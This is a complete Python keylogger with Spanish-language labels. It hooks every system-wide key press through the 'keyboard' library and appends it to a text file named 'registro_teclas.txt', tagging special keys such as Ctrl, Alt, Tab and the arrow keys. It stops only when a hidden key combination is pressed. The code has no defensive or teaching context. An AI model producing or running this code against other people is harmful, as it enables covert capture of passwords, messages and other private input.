import keyboard
import unicodedata

def on_key_event(e):
    with open('registro_teclas.txt', 'a', encoding='utf-8') as f:
        if e.event_type == keyboard.KEY_DOWN:
            if e.name == 'caps lock':
                f.write('Bloq Mayus\n')
            elif e.name == 'space':
                f.write(' ')
            elif e.name == 'esc':
                f.write(' [ESC] ')
            elif e.name == 'enter':
                f.write('\n')
            elif e.scan_code == 14:
                f.write(' [DEL] ')
            elif e.scan_code == 56:
                f.write(' [ALT] ')
            elif e.scan_code == 541:
                f.write(' [ALTGR] ')
            elif e.scan_code in [72, 80, 77, 75]:
                f.write(f' [FLECHA {e.name.upper()}] ')
            elif e.scan_code == 15:
                f.write(' [TAB] ')
            elif e.scan_code == 29:
                f.write(' [CTRL] ')
            elif len(e.name) == 1:
                char = unicodedata.normalize('NFC', e.name.upper())
                f.write(char)

keyboard.hook(on_key_event)
keyboard.wait('ctrl+alt+shift+e')
